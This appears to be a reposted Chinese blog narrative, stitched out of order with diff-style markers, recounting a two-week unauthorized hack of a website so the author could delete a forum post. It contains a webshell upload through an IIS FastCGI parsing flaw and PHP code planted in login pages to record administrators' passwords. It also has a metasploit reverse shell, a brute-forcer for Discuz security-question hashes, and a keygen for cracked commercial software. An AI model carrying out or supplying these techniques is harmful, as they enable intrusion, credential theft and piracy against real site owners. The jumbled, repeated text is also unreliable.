<p>只要管理员登陆后台，密码就会被记录在page.gif中，剩下的就只有等了。</p>  <p>但我不是一个忍者，等了一天无果后，我就在他数据库网站配置字段做了点手脚</p>  <p>致使访问他网站首页是空白，但是后台还是可以正常登陆的。果然这家伙不到半天就急了，当天晚上的时候我就顺利的嗅探到了他的变态的密码。如图16：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image024" border="0" alt="clip_image024" src="http://img.cker.in/2_201D/clip_image024.jpg" width="480" height="159"></p>  <p>图16</p>  <p>从图16可以看到，密码果然很强悍，10位以上，字母数字再加上+-号，让www.cmd5.com再添50公斤的硬盘也破不了啊。</p>  <p>拿到这个关键性的密码，再用前面研究出的3hoocms 后台getshell漏洞，轻车熟路的拿下<a href="http://www.bbb.com/" target="_blank" rel="external">www.bbb.com</a>的webshell，也就是a.111.com所在的虚拟主机。</p>  <p>接下来的任务就是提权跨目录到a.111.com了。</p>  <p><b>0</b><b>×0a 突破星外+护卫神</b></p>  <p>进行到这里，在星外虚拟主机+护卫神.入侵防护专家的防御之下，确实让人望而却步。好在php版本比较低，我终于用上了那个调试好的php溢出漏洞。在metasploit生成一个反弹端口的shellcode添加到那个exp.php代码中后。我在本机执行nc –vvlp 8181,然后把exp.php传到<a href="http://www.bbb.com/" target="_blank" rel="external">www.bbb.com</a>根目录。当我在浏览器打开<a href="http://www.bbb.com/exp.php" target="_blank" rel="external">http://www.bbb.com/exp.php</a>时，立刻出现了如图17的错误：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image026" border="0" alt="clip_image026" src="http://img.cker.in/2_201D/clip_image026.jpg" width="557" height="110"></p>  <p>图17</p>  <p>从图17返回的内容来看，应该是没有成功。后来我在vmware_win2003设置了和目标操作系统+php版本+php执行方式（ISAPI）一模一样的环境，我顺利反弹回来一个nt network权限的shell。这里我考虑应该是w3wp.exe 执行的shellcode ，所以继承w3wp的nt network权限。但不论怎样也是个交互式可执行命令的shell啊。我第6次悲催的运气，促使我终于找到了答案，原来目标win2003打开了dep（堆栈数据执行保护）。</p>  <p>我仍然没有气馁，虽然上次域名过期那个站的目录没有执行aspx的权限，那么这个<a href="http://www.bbb.com/" target="_blank" rel="external">www.bbb.com</a>的目录我还没试呢。万一支持aspx不就又多一种执行命令的方法吗？即这个方法：</p>  <p>System.Diagnostics.Process.Start(@&quot;calc.exe&quot;);)</p>  <p>这次我果然没有再次苦命，bbb.com是支持aspx的，只是有两个问题需要解决。</p>  <p>1. 护卫神几乎杀光了所有的aspx木马，需要突破。</p>  <p>2. 星外虚拟主机的可写可执行目录的寻找是个大麻烦。需要寻觅一个，上传cmd.exe，来支持aspx执行命令，因为大家都知道win2003默认情况，c:\windows\system32\cmd.exe只对administrator有权限读写。</p>  <p>第一个问题比较好解决，改变一下字段名，除去敏感字符串，再把函数位置条换一下。也就能过了，最多也就是再加密一下而已。</p>  <p>至于第二个问题，我倒没有什么好方法，只能写个遍历脚本，测试可读的每一个目录是否有漏网的可写目录存在了。这个网上有很多先人已经写出过这样的方法了，用拿来主义改一改即可。</p>  <p>终于被我找到了星外的一个可写目录是：</p>  <p>C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index</p>  <p>剩下的事情就简单了，我也懒得用pr大杀器，也用不着最新windows全版本的0day提权exp这个牛刀了。直接传一个cscript.exe+iisgetpass.vbs</p>  <p>读出所有网站用户的配置信息和密码即可。iisgetpass.vbs代码大家都有，我就不在这里占篇幅了。</p>  <p>最终结果如图18：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image028" border="0" alt="clip_image028" src="http://img.cker.in/2_201D/clip_image028.jpg" width="557" height="233"></p>  <p>图18</p>  <p>一般这样的结构的网站,iis账户的密码就是ftp的密码。就这样我得到了a.111.com的ftp账户和密码，并成功把其拿下。</p>  <p>由于主目标<a href="http://www.aaa.com/" target="_blank" rel="external">www.aaa.com</a>只开80,也无法用这个ftp密码去尝试它，并且再用这个密码尝试其论坛管理员的密码又无结果，只能继续嗅探了。</p>  <p><b></b></p>  <p><b></b>拿下a.111.com后，还是有一些惊喜的。我看到了<a href="http://www.111.com的早期的论坛数据库存在于a.111.com/" target="_blank" rel="external">www.111.com的早期的论坛数据库存在于a.111.com</a>的库中，并且我经过转换，其管理员的discuz! Hash密码与a.111.com的md5 hash密码是一样的。</p>  <p>其实这个对比很简单。</p>  <p>假设a.111.com中管理员的密码hash为：228ab4dd53787ce32a88ade0eeea8a51</p>  <p>早期<a href="http://www.111.com的discuz/" target="_blank" rel="external">www.111.com的discuz</a> 管理员密码hash为：</p>  <p>8946fa73f2b44b64da2ebab1aaa57ec6：42ee90</p>  <p>那么测试md5(228ab4dd53787ce32a88ade0eeea8a5142ee90)如果等于8946fa73f2b44b64da2ebab1aaa57ec6，则说明两个密码的明文是一样的。</p>  <p>因为discuz加密的方式是：md5(md5($pass).$salt)，我恰恰证实了这一点。</p>  <p>由于密码的复杂度不是现代的人类所能暴力破解的，我于是又一次选择了php登陆口密码嗅探。</p>  <p>于此同时还在继续着另一个工作，就是查找那个帖子所在版块的斑竹的用户名，拿到这些任何一个斑竹的密码不也一样能删帖子达到目的吗？但第7次悲催的运气告诉我，你省省吧，人家那个版块的斑竹就是管理员一个人。我再次无语。</p>  <p>还是老老实实的写代码嗅探吧。</p>  <p>我找到a.111.com的前台和后台登陆口添加了下面的代码。</p>  <p>$username1 = $this-&gt;Username;</p>  <p>$password1 = $this-&gt;Password;</p>  <p>$file=&quot;././images/ bg1.gif&quot;;</p>  <p>$handle = @fopen(&quot;././images/th_bg1.gif&quot;, &quot;a&quot;);</p>  <p>$recontent = fread($handle,filesize($file));</p>  <p>$content= $username1.&quot;—-&quot;.$password1.&quot;—-date is:&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;\r\n&quot;;</p>  <p>$result=$recontent.&quot;\r\n&quot;.$content;</p>  <p>@fwrite($handle,$result);</p>  <p>这次我没有着急，因为我发现这个管理员很勤快，几乎天天更新博客，于是第二天顺利记录到其密码。</p>  <p>在拿到管理员变态密码迫不及待的登陆之后，第8次悲催的运气也同时降临了。他需要提示问题的答案才能登陆。</p>  <p>鬼才知道他母亲的名字，他爷爷的名字，他父亲出生的城市，他老师的名字……</p>  <p>再说他也不一定就老老实实写真实答案啊。</p>  <p>在以前，我遇到此类情况都是直接放弃，但是这次不同，前面一个多礼拜承载了我太多的磨难和脑细胞，我无法说服自己放弃。</p>  <p>不是有一个早期的bbs的用户数据库嘛？我于是找到了密码提示问题答案的加密字段为：2afd4591.仅仅是一个8位的串，到底是什么加密算法呢。</p>  <p>我再次担当了阅读源代码的苦力差事。引用2yue的一句话，把我累得跟骆驼一样，终于得到如下结果。</p>  <p>Discuz提示问题有7个，按数字序号是1,2,3,4,5,6,7。设为变量$i</p>  <p>明文答案设为变量$pass.</p>  <p>那么2afd4591=substr(md5($pass.md5($id)),16,8)</p>  <p>这样的话，提示问题答案是可以暴力跑的啊，但如果他的答案是汉字或者很变态的长度的明文，也是很难爆出来的。我发现他最后的hash串仅仅是8位，那么有很大的几率是可以碰撞成功的。</p>  <p>于是我认为：肯定存在多个明文，hash与2afd4591一样，但明文不一样，我十分肯定我的分析。</p>  <p>下面就需要先制作一个大字典，然后开始写程序，碰撞吧。</p>  <p><b></b></p>  <p><b></b>我可没有那么多耐性去做重复的工作，我认为肯定有很多人写过字典生成工具，下载一个用就是了。于是我下载到这个小工具superdic，还挺好用的。如图19：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image029" border="0" alt="clip_image029" src="http://img.cker.in/2_201D/clip_image029.jpg" width="493" height="337"></p>  <p>图19</p>  <p>图19告诉我，如果要使用完整功能，需要花注册费15元。</p>  <p>自己操刀OllyDBG调试一下，看这个作者用什么加密算法保护自己的程序吧。其实有时候调试算法，破解作者的加密思路也是一个不错的游戏，但是这次我没有那么多精力了，如果它能在两个小时内阻挡我，那我就从我绵薄的存款中给作者奉献一回吧。</p>  <p>先用peid加载superdic.exe如图20</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image030" border="0" alt="clip_image030" src="http://img.cker.in/2_201D/clip_image030.jpg" width="419" height="226"></p>  <p>图20</p>  <p>从图20可以看出，软件是vc++6.0写的，且没有加壳。看到这些我很遐意，看来省了我不少事。再用ida加载函数库符号并导入OllyDBG后，就可以开始分析了。</p>  <p>F9运行后我首先用注册码等于123456789，点注册，弹出一个对话框，提示“请重启本程序，如果您输入的注册密码正确，将能使用本软件的全部功能，并可享受后续版本的免费升级。”那么一般来说，重启验证要么是keyfile,要么是写入注册表。经过下断点测试，我发现该程序使用的是注册表验证。</p>  <p>这样一来，下断就有思路了。</p>  <p>用OllyDBG加载superdic.exe后，在命令行下断bp RegOpenKeyExA,然后按f9让其运行，眼睛同时观察着右边的堆栈窗口，在第6次f9之后，断在了这里如图21：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image032" border="0" alt="clip_image032" src="http://img.cker.in/2_201D/clip_image032.jpg" width="557" height="278"></p>  <p>图21</p>  <p>从堆栈可以看到该软件注册表的位置是：Software\EUsoft\superdic</p>  <p>用regedit打开看一下这个位置如图22：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image034" border="0" alt="clip_image034" src="http://img.cker.in/2_201D/clip_image034.jpg" width="558" height="122"></p>  <p>图22</p>  <p>图22中看到了superdic把用户名和注册码都保存在了Software\EUsoft\superdic这个位置。</p>  <p>这时在0x77da7852这个位置，按f2取消断点，然后alt+f9即可回到应用程序领空。这样一路f8可以来到这里</p>  <p>/<em>403AEA</em>/ LEA ESI,DWORD PTR DS:[EBX+6FC]</p>  <p>/<em>403AF0</em>/ PUSH ESI</p>  <p>/<em>403AF1</em>/ CALL superdic.004027A0</p>  <p>/<em>403AF6</em>/ ADD ESP,0C</p>  <p>/<em>403AF9</em>/ MOV ECX,EBX</p>  <p>/<em>403AFB</em>/ PUSH ESI</p>  <p>/<em>403AFC</em>/ PUSH 4A0</p>  <p>/<em>403B01</em>/ CALL superdic.00430B3C</p>  <p>/<em>403B06</em>/ MOV EDX,DWORD PTR DS:[EBX+218]</p>  <p>/<em>403B0C</em>/ LEA ESI,DWORD PTR DS:[EBX+218]</p>  <p>/<em>403B12</em>/ PUSH 0FF</p>  <p>/<em>403B17</em>/ MOV ECX,ESI</p>  <p>可以在0x403af0处设置一个断点，接着f7进入CALL superdic.004027A0，大致一看应该是申请号的生成方法,代码如下：</p>  <p>004027A0 SUB ESP,0C</p>  <p>004027A3 PUSH ESI</p>  <p>004027A4 PUSH 0C</p>  <p>004027A6 CALL superdic.004319E7</p>  <p>004027AB PUSH 0A</p>  <p>004027AD MOV ESI,EAX</p>  <p>004027AF CALL superdic.004319E7</p>  <p>004027B4 ADD ESP,8</p>  <p>004027B7 LEA ECX,DWORD PTR SS:[ESP+C]</p>  <p>004027BB LEA EDX,DWORD PTR SS:[ESP+4]</p>  <p>004027BF PUSH 0A ; /pFileSystemNameSize = 0000000A</p>  <p>004027C1 PUSH EAX ; |pFileSystemNameBuffer</p>  <p>004027C2 LEA EAX,DWORD PTR SS:[ESP+10] ; |</p>  <p>004027C6 PUSH EAX ; |pFileSystemFlags</p>  <p>004027C7 PUSH ECX ; |pMaxFilenameLength</p>  <p>004027C8 PUSH EDX ; |pVolumeSerialNumber</p>  <p>004027C9 PUSH 0C ; |MaxVolumeNameSize = C (12.)</p>  <p>004027CB PUSH ESI ; |VolumeNameBuffer</p>  <p>004027CC PUSH superdic.00446148 ; |RootPathName = &quot;c:\&quot;</p>  <p>004027D1 CALL DWORD PTR DS:[&lt;&amp;KERNEL32.GetVolumeI&gt;; \GetVolumeInformationA</p>  <p>004027D7 MOV EAX,DWORD PTR SS:[ESP+4]</p>  <p>004027DB MOV ESI,DWORD PTR SS:[ESP+14]</p>  <p>004027DF PUSH EAX</p>  <p>004027E0 PUSH superdic.00446144 ; ASCII &quot;%x&quot;</p>  <p>004027E5 PUSH ESI</p>  <p>004027E6 CALL &lt;superdic._sprintf&gt;</p>  <p>这段代码大概是使用GetVolumeInformationA函数再加上其他一系列操作生成申请号的过程，因为是逆注册算法，这一块我们不关心，可以直接f8过去看结果即可，而事实上也确实生成一个子串是24578843，与图19中的申请号相一致。</p>  <p>我接着往下走，前面不关键的地方就不跟了，一直走到这里：</p>  <p>/<em>403D48</em>/ LEA EAX,DWORD PTR DS:[EBX+6FC]</p>  <p>/<em>403D4E</em>/ PUSH ECX</p>  <p>/<em>403D4F</em>/ PUSH EAX</p>  <p>/<em>403D50</em>/ CALL superdic.004034E0</p>  <p>可以看到把申请号压入了堆栈，而函数CALL superdic.004034E0经判断是对申请号做了一次加密过程。从堆栈处看到加密后密文是：</p>  <p>0012EF6C 0012EFA0 ASCII &quot;BqwITTcm8kG5lcEk&quot;</p>  <p>接着再f8配合f7来慢慢走。</p>  <p>/<em>403D5B</em>/ PUSH ESI</p>  <p>/<em>403D5C</em>/ CALL superdic.00403630</p>  <p>403d5b的位置是把注册码压入堆栈，随即利用CALL superdic.00403630做了一次加密过程。</p>  <p>过了这个call后把我预设的123456789加密成了l6345q789.看下面堆栈数据。</p>  <p>0012EF64 0012FCA0 ASCII &quot;l6345q789&quot;</p>  <p>随后又经过一些对算法无用的代码后来到这里：</p>  <p>/<em>403EBD</em>/ MOV DL,BYTE PTR DS:[ESI]</p>  <p>/<em>403EBF</em>/ MOV CL,BYTE PTR DS:[EDI]</p>  <p>/<em>403EC1</em>/ MOV AL,DL</p>  <p>/<em>403EC3</em>/ CMP DL,CL</p>  <p>/<em>403EC5</em>/ JNZ SHORT superdic.00403EE5</p>  <p>/<em>403EC7</em>/ TEST AL,AL</p>  <p>/<em>403EC9</em>/ JE SHORT superdic.00403EE1</p>  <p>/<em>403ECB</em>/ MOV CL,BYTE PTR DS:[ESI+1]</p>  <p>/<em>403ECE</em>/ MOV DL,BYTE PTR DS:[EDI+1]</p>  <p>/<em>403ED1</em>/ MOV AL,CL</p>  <p>/<em>403ED3</em>/ CMP CL,DL</p>  <p>/<em>403ED5</em>/ JNZ SHORT superdic.00403EE5</p>  <p>/<em>403ED7</em>/ ADD ESI,2</p>  <p>/<em>403EDA</em>/ ADD EDI,2</p>  <p>/<em>403EDD</em>/ TEST AL,AL</p>  <p>/<em>403EDF</em>/ JNZ SHORT superdic.00403EBD</p>  <p>/<em>403EE1</em>/ XOR EAX,EAX</p>  <p>/<em>403EE3</em>/ JMP SHORT superdic.00403EEA</p>  <p>/<em>403EE5</em>/ SBB EAX,EAX</p>  <p>/<em>403EE7</em>/ SBB EAX,-1</p>  <p>/<em>403EEA</em>/ XOR EDX,EDX</p>  <p>/<em>403EEC</em>/ PUSH 476</p>  <p>/<em>403EF1</em>/ TEST EAX,EAX</p>  <p>/<em>403EF3</em>/ SETE DL</p>  <p>/<em>403EF6</em>/ MOV ECX,EBX</p>  <p>/<em>403EF8</em>/ MOV DWORD PTR DS:[EBX+90],EDX</p>  <p>这段代码即是：BqwITTcm8kG5lcEk与l6345q789的对比过程，如果相等就注册成功。</p>  <p>作者的大题思路就是这样吧，如果爆破的话只需要把403EF1处改为下面的代码即可。</p>  <p>/<em>403EF1</em>/ MOV DL,1</p>  <p>但分析到这里，爆破已经满足不了我的欲望了，再说离我的两个小时还差的远呢。接着看看作者算法的思路吧。</p>  <p>既然我分析的思路已经清晰，我在这里再稍作整理：、</p>  <p>设CALL superdic.004034E0函数=f1()</p>  <p>CALL superdic.00403630函数=f2()</p>  <p>如果f1(申请号)=f2(注册码) 那么就注册成功。</p>  <p>看来f2()函数是关键啊，需要写出它的逆函数，f7进去一看，貌似还很长，如图23：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image035" border="0" alt="clip_image035" src="http://img.cker.in/2_201D/clip_image035.jpg" width="434" height="427"></p>  <p>图23</p>  <p>仅仅图23的一页，还显示不完，我再次像骆驼一样的f7走来走去，再加上ida的f5，终于对这段代码有了初步的了解。</p>  <p>最终我使用了一种巧妙的办法写出了这段代码的逆函数如下。</p>  <p>有点基础的朋友自己看代码吧。我也不好在这里占用太大篇幅去深析这个算法的逆向过程。</p>  <p>void DicDecode(char <em>str)</em></p>  <p>{</p>  <p>char end[64]={0};</p>  <p>if (strlen(str) !=16) str=0;</p>  <p>for(int i=0,j=0;i&lt;16,j&lt;64;i++,j=j+4)</p>  <p>{</p>  <p>if(str[i]&lt;=’9’ &amp;&amp; str[i]&gt;=’0’)</p>  <p>{</p>  <p>end[j]=str[i]-22;</p>  <p>goto LABEL_a;</p>  <p>}</p>  <p>if(str[j]&lt;=’z’ &amp;&amp; str[i]&gt;=’a’)</p>  <p>{</p>  <p>end[j]=str[i]-61;</p>  <p>goto LABEL_a;</p>  <p>}</p>  <p>if(str[i]&lt;=’Z’ &amp;&amp; str[i]&gt;=’A’)</p>  <p>{</p>  <p>end[j]=str[i]-65;</p>  <p>}</p>  <p>LABEL_a:</p>  <p>;</p>  <p>}</p>  <p>for(i=0;i&lt;64;i=i+4)</p>  <p>{</p>  <p>if(end[i]&lt;=i)</p>  <p>{</p>  <p>end[i]=i-end[i];</p>  <p>}</p>  <p>}</p>  <p>int v10[16];</p>  <p>for(int k=0,n=0;k&lt;16,n&lt;64;k++,n=n+4)</p>  <p>{</p>  <p>v10[k]=(int)end[n];</p>  <p>}</p>  <p>for(i=0;i&lt;16;i++)</p>  <p>{</p>  <p>if(v10[i] &lt;= 25 &amp;&amp; v10[i]&gt;=0)</p>  <p>{</p>  <p>str[i]=v10[i]+ 65;</p>  <p>goto LABEL_bb;</p>  <p>}</p>  <p>if(v10[i] &lt;= 35 &amp;&amp; v10[i]&gt;=26)</p>  <p>{</p>  <p>str[i]=v10[i]+ 22;</p>  <p>goto LABEL_bb;</p>  <p>}</p>  <p>if(v10[i] &lt; 61 &amp;&amp; v10[i]&gt;=36)</p>  <p>{</p>  <p>str[i]=v10[i]+ 61;</p>  <p>}</p>  <p>LABEL_bb:</p>  <p>;</p>  <p>}</p>  <p>char sigeliu[5]={0x36,0x36,0x36,0x36,0};</p>  <p>strcat(str,sigeliu);</p>  <p>}</p>  <p>总之最后累的跟骆驼似的终于还是凑出了这个半成品的注册机。如图24：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image036" border="0" alt="clip_image036" src="http://img.cker.in/2_201D/clip_image036.jpg" width="495" height="316"></p>  <p>图24</p>  <p>该注册机的用法是在00403D5B处，看堆栈得到f1(申请号)= BqwITTcm8kG5lcEk.</p>  <p>把这个值写入密文框内，点击解密就得到其注册码。这时看了看表大概用了110分钟，好险，差点损失15块钱。</p>  <p>字典生成器破解完后，我开始酝酿写这个discuz! 提示问题的碰撞程序。由于php的易用性，我选择用它来写。说白了也就是个穷举的过程。代码如下：</p>  <p>&lt;?</p>  <p>/<em>discuz提示问题答案暴力破解程序。</em>/</p>  <p>error_reporting(0);</p>  <p>if ($argc&lt;2) {</p>  <p>print_r(‘</p>  <p>——————————————————————</p>  <p>Usage: php ‘.$argv[0].’ hash</p>  <p>Example:</p>  <p>php ‘.$argv[0].’ 91de8255</p>  <p>——————————————————————</p>  <p>‘);</p>  <p>die;</p>  <p>}</p>  <p>$fd=fopen(&quot;pass.dic&quot;,r);</p>  <p>if(!$fd)</p>  <p>{</p>  <p>echo &quot;error:打开字典文件错误&quot; ;</p>  <p>die;</p>  <p>}</p>  <p>while($buf=fgets($fd))</p>  <p>{ </p>  <p>for($i=1;$i&lt;8;$i++)</p>  <p>{</p>  <p>$tmp=substr(md5(trim($buf).md5($i)),16,8);</p>  <p>//echo $tmp;</p>  <p>$conn = strcmp($tmp,$argv[1]);</p>  <p>if($conn==0)</p>  <p>{</p>  <p>echo &quot;密码破解成功。\n&quot;.&quot;提示问题答案为：&quot;.$buf.&quot;提示的问题为:&quot;.theask((int)$i).&quot;\n&quot;;</p>  <p>die;</p>  <p>}</p>  <p>}</p>  <p>}</p>  <p>if($conn!=0)</p>  <p>{</p>  <p>echo &quot;没有正确的密码&quot;;</p>  <p>}</p>  <p>fclose($fd);</p>  <p>function theask($var){</p>  <p>if($var==1) {</p>  <p>return &quot;母亲的名字&quot;;</p>  <p>}</p>  <p>elseif($var==2) {</p>  <p>return &quot;爷爷的名字&quot;;</p>  <p>}</p>  <p>elseif($var==3) {</p>  <p>return &quot;父亲出生的城市&quot;;</p>  <p>}</p>  <p>elseif($var==4) {</p>  <p>return &quot;您其中一位老师的名字&quot;;</p>  <p>}</p>  <p>elseif($var==5) {</p>  <p>return &quot;您个人计算机的型号&quot;;</p>  <p>}</p>  <p>elseif($var==6) {</p>  <p>return &quot;您最喜欢的餐馆名称&quot;;</p>  <p>}</p>  <p>elseif($var==7) {</p>  <p>return &quot;驾驶执照最后四位数字&quot;;</p>  <p>}</p>  <p>}</p>  <p>?&gt;</p>  <p>我使用自己保存的100M大字典破解没有成功。后来我把这个脚本放在了一朋友的服务器上，然后用superdic生成了3G的大字典，直接丢在服务器上碰撞吧。</p>  <p><b></b></p>  <p>其实我坚信，在8位的字母加数字的大字典中去做碰撞的话肯定会成功的。只是我没有那么大的硬盘，只做了6位字母来测试。</p>  <p>又经过一天后，等我登陆朋友的服务器3389之时，我发现得到了结果如图25：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image037" border="0" alt="clip_image037" src="http://img.cker.in/2_201D/clip_image037.jpg" width="298" height="90"></p>  <p>图25</p>  <p>我敢肯定，ufedys肯定不是这个管理员的答案。于是hash相同，明文却不相同的碰撞终于成功了。我默默在心里说了声：碰撞V5。</p>  <p>剩下的应该比较容易了，登入后台，上传一个带php一句话木马的美女图片。（不要告诉我，你在discuz! X2后台找不到上传的地方啊）。然后利用类似这样的url：</p>  <p><a href="http://www.222.com/data/attachment/common/cf/212018txqnu4rcee3iek52.jpg/kyo.php" target="_blank" rel="external">http://www.222.com/data/attachment/common/cf/212018txqnu4rcee3iek52.jpg/kyo.php</a> 连接菜刀，就这样彻底拿下了该目标。</p>  <p>既然Webshell都拿到了，删帖子这么简单的事情还用我继续说吗？</p>  <p><b></b>到这里，费时两周的渗透也算是结束了，实战过程中其实还遇到了更多的各种各样问题，只不过本文是后来补写的，很多细节都忘却了，但主要的东西都已经在文章中体现了。</p>  <p>原文：转自混世魔王，作者太低调了就不贴出网址了，看文章学习交流就好，如果作者对转载有意见可以联系我。</p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2012-06-12T10:18:44.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
-    
-</span>
-    <h1 class="post-title">2个星期艰难的渗透纪实</h1>
-    <section class="post-content">
-      <p><b>2</b><b>个星期艰难的渗透纪实</b></p>  <p>作者：kyo327<b></b></p>  <p>入侵原因，需删一帖子，目标用www.111.com代替，前期通过初期的网站文件暴力猜解，扫描到robots.txt这个文件，有以下目录。如图1：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/2_201D/clip_image001.jpg" width="254" height="284"></p>  <p>图1</p>  <p>再通过对这些文件的访问，从3gadm.php文件的标题栏得到该网站采用的是diy-page8.3的cms，自然可以先用搜索引擎搜索该cms暴露的已知漏洞入手。我搜到的大概有三个版本别人分析的结果：一个是子仪的盲注exp，还有两个是来自t00ls的。由于该网站服务器安装有WEB防火墙，导致同一个IP不能多次连续的提交get或post请求，否则就被认为是非法的。这样一来盲注那个exp也就一直没有成功，而我测试使用t00ls小蟑螂那个exp时，在本机自己搭建环境的最新版本是成功的，但是目标仍然失败，我考虑也许是目标版本较低的原因。</p>  <p>由于后台文件admin.php被改名，同时也在进行着网站后台文件的暴力猜解中。不过也许我的字典文件不够大也不够好，结果很令人失望。并且该网站做了禁止普通用户注册、禁止普通用户登陆的安全措施，这样连传图片的权利也给封杀了。</p>  <p>再看他的论坛，毕竟要删的帖子是在论坛上的，但他使用的是最新版的</p>  <p>discuz! X2，因为我测试了之前那个漏洞不好使。</p>  <p>到这里该目标的网站程序方面大概有了些了解，但有用的信息不是很多。接着我用nmap扫描了web服务器的端口情况，只开了80，也许其他端口被防火墙K掉了吧。通过经验访问一个不存在目录，服务器返回如图2：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/2_201D/clip_image002.jpg" width="540" height="144"></p>  <p>图2</p>  <p>从图2看出，貌似是iis7.0或iis7.5，再用iiswrite.exe对网站发送一个head包，返回 Server: Microsoft-IIS/7.5，这样的话大概能确定该网站服务器操作系统应该是windows2008.</p>  <p>通过上面的分析，没有找到什么突破口，接下来大家都能想到，可以扫描一下他web服务器上都有哪些网站，从该服务器上的其他网站入手是大家一贯的手法，我也就不多说了。只是我是个苦命人啊，再次遇到cdn，无法简单的判断网站的真实IP。</p>  <p>关于cdn我在这里用简单的几句话科普一下，用户在自己的<a href="http://baike.baidu.com/view/7718.htm" target="_blank" rel="external">浏览器</a>中输入要访问的网站的域名，网站主dns选择比较近的cdn服务商节点，并把请求的内容缓存到cdn节点服务器，再把cdn节点服务器ip返回给用户，最后用户再向给定的cdn接点请求网站内容。</p><a id="more"></a><p></p>  <p>我测试使用不同地区的vpn去ping网站域名，发现ip都不一样，后来通过google搜索他网站的相关帖子，发现有另外一个域名www.222.com显示相同的内容。再次用此域名进行旁注域名查询，总算有了真实的结果，如图3：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/2_201D/clip_image003.jpg" width="497" height="320"></p>  <p>图3</p>  <p>但令人悲催的是，这几个域名最终全都指向了主网站和论坛。</p>  <p>由于<a href="http://www.222.com/" target="_blank" rel="external">www.222.com</a>是直接指向论坛，而<a href="http://www.111.com/" target="_blank" rel="external">www.111.com</a>指向cms,可以判断两个网站应该是不同的虚拟目录。于是我用自己写的扫描器对www.222.com进行了网站文件暴力猜解如图4：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/2_201D/clip_image005.jpg" width="557" height="444"></p>  <p>图4</p>  <p>从图4中看到，总算有个信息泄露的问题了。</p>  <p>打开phpinfo.php得到如图5：</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/2_201D/clip_image006.jpg" width="386" height="281"></p>  <p>图5</p>  <p>从图5我得到了，目标操作系统是windows2008,php运行方式FASTCGI,PHP版本5.2.17，还有网站物理路径等等，让我眼前一亮的是iis7.5+FASTCGI在默认情况下，IIS处理请求的时候可能导致如nginx安全漏洞一样的问题，任何用户可以远程将任何类型的文件以PHP的方式去解析。</p>  <p>我马上找到一个该网站某个图片链接地址进行类似这样的请求：<a href="http://www.222.com/images/aaa.gif/kyo.php" target="_blank" rel="external">http://www.222.com/images/aaa.gif/kyo.php</a> ,没有返回404，并且返回的http头状态码是200，这时我基本肯定了该漏洞的存在。新想，这个站死定了。但我没想到后面的过程竟是如此艰难。</p>  <p>随后我带着喜悦的心情，迅速的在该论坛注册了账户，并急切的上传那个带着一句话php木马的美女图片，但结果仍然是令人沮丧的，论坛设置了所有附件传到另外一个文件服务器上，而那个文件服务器是windows2003，没有类似的bug，并且和目标不在一个C段。可这个漏洞却很诱人的，我还考虑到论坛显示帖子是html文件类型的，如果能在显示帖子的html里写入&lt;?php phpinfo();?&gt;倒也是可以利用的，只是&lt;&gt;总是被过滤为&amp;lt; &amp;gt;，主站的cms又禁止登陆，cms后台文件也无法找到，看来只能再换换别的思路了。</p>  <p>每个做网络安全的应该都了解，在网络上每个人享受各种服务，上论坛，听音乐，网上支付，购物等等。最重要的就是自己的密码，而账号大多都是公开的，只要我们拥有目标的常用密码，就可以尝试他的其他网站的登录验证，因此我开始了从二级域名入手的打算，拿下后至少可以得到他的常用密码之一。</p>  <p>通过他本网站的链接和二级域名爆破查询工具，再加上自己的分析，我得到了target比较主要的一个二级域名为:a.111.com，仍然是一个比较成熟的、没有任何已知漏洞的cms的博客程序，值得庆幸的是，这个二级域名所在的服务器倒有十几个其他的网站，应该是虚拟主机，操作系统是win2003，同时支持php和asp.</p>  <p>我首先瞄上了一个站是：<a href="http://www.aaa.com/" target="_blank" rel="external">www.aaa.com</a>,很轻松的扫描出他后台管理文件为：</p>  <p><a href="http://www.aaa.com/admin/admin_index.php" target="_blank" rel="external">http://www.aaa.com/admin/admin_index.php</a> 直接把url在浏览器浏览发现他没有做严密的验证，后台一部分功能是可以使用的，如图6</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/2_201D/clip_image008.jpg" width="547" height="355"></p>  <p>图6</p>  <p>并且后台使用了FCKeditor，是最新版本，测试了这个编辑器的漏洞集合后无果，只能把希望寄托在图6的上传图片那里是否有问题了。这次还算顺利，我在vmware的winxp系统用WSockExpert.exe抓了一下上传的包，在一句话asp木马里添加下gif89a头，再在包的这里改为：</p>  <p>Content-Disposition: form-data; name=&quot;article_img&quot;; filename=&quot;C:\aa.asp 